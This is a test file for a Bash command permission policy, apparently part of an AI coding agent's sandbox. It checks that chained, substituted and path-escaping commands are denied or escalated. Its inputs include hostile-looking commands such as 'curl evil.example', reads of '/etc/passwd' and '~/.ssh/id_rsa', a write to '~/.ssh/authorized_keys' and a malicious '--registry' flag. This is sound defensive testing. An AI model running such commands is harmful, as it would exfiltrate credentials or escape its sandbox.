import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { cleanupTempDir, makeTempDir } from "@test/helpers";
import type { BashApprovalMode } from "@/config/bash-approval";
import { compileToolPolicy } from "@/tools";

const BASH_SCOPE = { pathFields: [], commandField: "command" } as const;

let root: string;
let outside: string;

beforeEach(() => {
  root = makeTempDir("policy-bash-");
  outside = makeTempDir("policy-bash-outside-");
  writeFileSync(join(root, "file.txt"), "x");
});

afterEach(() => {
  cleanupTempDir(root);
  cleanupTempDir(outside);
});

function policyFor(
  patterns: readonly string[],
  options?: { deny?: readonly string[]; ask?: readonly string[]; bashApproval?: BashApprovalMode },
) {
  return compileToolPolicy([{ tool: "Bash", patterns }], root, {
    ...(options?.deny !== undefined ? { denyRules: [{ tool: "Bash", patterns: options.deny }] } : {}),
    ...(options?.ask !== undefined ? { askRules: [{ tool: "Bash", patterns: options.ask }] } : {}),
    ...(options?.bashApproval !== undefined ? { bashApproval: options.bashApproval } : {}),
  });
}

const check = (policy: ReturnType<typeof policyFor>, command: string) => policy.check("Bash", BASH_SCOPE, { command });

describe("granted commands run", () => {
  test("a trailing * is optional: the bare prefix is allowed (spec §4 US-005.3)", () => {
    const policy = policyFor(["bun test *"]);
    expect(check(policy, "bun test").allowed).toBe(true);
    expect(check(policy, "bun test src/a.test.ts").allowed).toBe(true);
  });

  test("prefix matching is token-wise, never substring", () => {
    expect(check(policyFor(["bun test *"]), "bun testx").allowed).toBe(false);
  });

  test("every segment of a multi-segment command may be allowed", () => {
    const policy = policyFor(["bun test *", "bun run lint"]);
    expect(check(policy, "bun test && bun run lint").allowed).toBe(true);
  });

  test("a redirect inside the root is allowed", () => {
    expect(check(policyFor(["bun test *"]), "bun test > out.txt").allowed).toBe(true);
  });
});

describe("the deny suite rows this branch owns (spec §6)", () => {
  test("row 3: one unmatched segment denies the whole call", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test x && curl evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("curl evil.example");
  });

  test.each([
    ["command substitution", "bun test $(whoami)"],
    ["backtick", "bun test `whoami`"],
    ["here-document", "bun test <<EOF"],
  ])("row 4: %s is refused even under a granted prefix", (_label, command) => {
    const verdict = check(policyFor(["bun test *"]), command);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("cannot be analysed");
  });

  test("row 5: a path token outside the root denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat ../../etc/passwd");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 5: a path token inside .git/ denies with breach", () => {
    const verdict = check(policyFor(["cat *"]), "cat .git/config");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("row 6: a redirect target outside the root denies", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test > ../escape.txt");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
  });

  test("row 6: a `~`-prefixed redirect target denies (expansion escapes containment)", () => {
    const verdict = check(policyFor(["bun test *"]), "bun test > ~/evil.txt");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.reason).toContain("redirect");
    }
  });

  test("row 6: a `~`-prefixed redirect to a sensitive path denies", () => {
    const verdict = check(policyFor(["echo *"]), "echo x > ~/.ssh/authorized_keys");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("redirect");
  });

  test("row 7: a DENIED_FLAGS-class flag denies under a granted prefix", () => {
    const verdict = check(policyFor(["bun add *"]), "bun add left-pad --registry https://evil.example");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("--registry");
  });

  test("row 8: deny beats allow", () => {
    const verdict = check(policyFor(["git *"], { deny: ["git push *"] }), "git push origin main");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("a `cd` outside the root is refused", () => {
    const verdict = check(policyFor(["cd *"]), "cd ../..");
    expect(verdict.allowed).toBe(false);
  });

  test("a `~`-prefixed token is refused (it depends on expansion this gate cannot see)", () => {
    expect(check(policyFor(["cat *"]), "cat ~/.ssh/id_rsa").allowed).toBe(false);
  });

  test("an opaque $VAR cannot satisfy a literal rule token", () => {
    expect(check(policyFor(["bun run $CMD"]), "bun run $CMD").allowed).toBe(false);
  });

  test("an opaque token that could expand into git metadata is refused under a wildcard grant", () => {
    const verdict = check(policyFor(["cat *"]), "cat $PWD/.git/config");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("expansion");
  });

  test.each(["cat link*", "cat file{a,b}"])("an unmodelled path expansion is refused: %s", (command) => {
    const verdict = check(policyFor(["cat *"]), command);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.reason).toContain("expansion");
  });

  test("an empty command is refused", () => {
    expect(check(policyFor(["bun test *"]), "   ").allowed).toBe(false);
  });
});

describe("containment is not defeated by a hiding prefix or a symlink", () => {
  test.each([["curl --output=/etc/passwd http://x"], ["curl -o/etc/passwd http://x"]])(
    "a flag-embedded absolute path is denied as a breach, naming the path: %s",
    (command) => {
      const verdict = check(policyFor(["curl *"]), command);
      expect(verdict.allowed).toBe(false);
      if (!verdict.allowed) {
        expect(verdict.breach).toBe(true);
        expect(verdict.reason).toContain("/etc/passwd");
      }
    },
  );

  test("a flag-embedded relative escape with no slash is denied as a breach", () => {
    // `--output-dir=..` carries no "/", so the whole word used to resolve as a
    // literal segment under the root while the command received "..".
    const verdict = check(policyFor(["bun test *"]), "bun test --output-dir=..");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });

  test("a `cd` to an option-shaped target is refused rather than tracked as a path", () => {
    const verdict = check(policyFor(["cd *", "cat *"]), "cd -");
    expect(verdict.allowed).toBe(false);
  });

  test("a bare symlink token pointing outside the root is denied as a breach", () => {
    const target = join(outside, "secret.txt");
    writeFileSync(target, "outside the root");
    symlinkSync(target, join(root, "link"));
    const verdict = check(policyFor(["cat *"]), "cat link");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.breach).toBe(true);
      expect(verdict.reason).toContain("link");
    }
  });

  test("a later segment resolves relative paths from a preceding cd", () => {
    const target = join(outside, "secret.txt");
    const nested = join(root, "subdir");
    mkdirSync(nested);
    writeFileSync(target, "outside the root");
    symlinkSync(target, join(nested, "link"));

    const verdict = check(policyFor(["cd *", "cat *"]), "cd subdir && cat link");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.breach).toBe(true);
  });
});

describe("ask", () => {
  test("row 9 (policy half): an ask-matched granted command asks, naming the rule", () => {
    const verdict = check(policyFor(["rm *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.outcome).toBe("ask");
      expect(verdict.rule).toBe("Bash(rm *)");
    }
  });

  test("ask never grants: an UNGRANTED command that matches an ask rule is a plain denial", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["rm *"] }), "rm src/a.ts");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("denied");
  });

  test("an unconditional ask rule does not short-circuit the command branch", () => {
    const verdict = check(policyFor(["bun test *"], { ask: ["*"] }), "bun test");
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.outcome).toBe("ask");
  });

  test("an unconditional deny rule de-advertises Bash", () => {
    const policy = policyFor(["bun test *"], { deny: ["*"] });
    expect(policy.grantedTools()).not.toContain("Bash");
  });
});

describe("escalatable marking", () => {
  test("a lexer refusal is escalatable", () => {
    const result = check(policyFor(["*"]), "echo $(whoami)");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.escalatable).toBe(true);
  });

  test("a grant non-match is escalatable", () => {
    const result = check(policyFor(["bun test*"]), "curl evil.example");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.escalatable).toBe(true);
  });

  test("a containment breach is NOT escalatable", () => {
    const result = check(policyFor(["*"]), "cat ../../etc/passwd");
    expect(result.allowed).toBe(false);
    if (!result.allowed) {
      expect(result.breach).toBe(true);
      expect(result.escalatable).toBe(false);
    }
  });

  test("a deny-rule match is NOT escalatable", () => {
    const result = check(policyFor(["*"], { deny: ["rm *"] }), "rm -rf build");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.escalatable).toBe(false);
  });
});

describe("bashApproval modes", () => {
  test("gated is the default when the option is absent", () => {
    const result = check(policyFor(["*"]), "echo $(whoami)");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.outcome).toBe("denied");
  });

  test("raw allows a construct the lexer refuses", () => {
    expect(check(policyFor(["*"], { bashApproval: "raw" }), "echo $(whoami)").allowed).toBe(true);
  });

  test("raw allows an ungranted command", () => {
    expect(check(policyFor([], { bashApproval: "raw" }), "curl evil.example").allowed).toBe(true);
  });

  test("raw still denies a parseable protected-path write", () => {
    const result = check(policyFor(["*"], { bashApproval: "raw" }), "echo x > .nax/features/f/prd.json");
    expect(result.allowed).toBe(false);
  });

  test("escalate turns a lexer refusal into ask", () => {
    const result = check(policyFor(["*"], { bashApproval: "escalate" }), "echo $(whoami)");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.outcome).toBe("ask");
  });

  test("escalate turns a grant non-match into ask", () => {
    const result = check(policyFor(["bun test*"], { bashApproval: "escalate" }), "curl evil.example");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.outcome).toBe("ask");
  });

  test("escalate does NOT escalate a containment breach", () => {
    const result = check(policyFor(["*"], { bashApproval: "escalate" }), "cat ../../etc/passwd");
    expect(result.allowed).toBe(false);
    if (!result.allowed) {
      expect(result.outcome).not.toBe("ask");
      expect(result.breach).toBe(true);
    }
  });

  test("escalate does NOT escalate a deny-rule match", () => {
    const result = check(policyFor(["*"], { bashApproval: "escalate", deny: ["rm *"] }), "rm -rf build");
    expect(result.allowed).toBe(false);
    if (!result.allowed) expect(result.outcome).not.toBe("ask");
  });
});
